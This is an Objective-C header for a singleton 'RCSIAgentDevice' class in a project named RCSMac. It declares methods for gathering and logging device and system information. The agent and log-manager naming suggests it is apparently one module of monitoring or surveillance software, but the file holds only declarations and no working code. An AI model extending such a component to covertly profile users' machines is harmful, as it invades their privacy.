//
//  RCSIAgentDevice.h
//  RCSMac
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "RCSILogManager.h"

@interface RCSIAgentDevice : NSObject <Agents>
{    
@public
  NSMutableDictionary *mAgentConfiguration;
}

@property (readwrite, retain) NSMutableDictionary *mAgentConfiguration;

+ (RCSIAgentDevice *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (BOOL)writeDeviceInfo: (NSData*)aInfo;
- (BOOL)getDeviceInfo;
- (NSData*)getSystemInfoWithType:(NSString*)aType;

@end
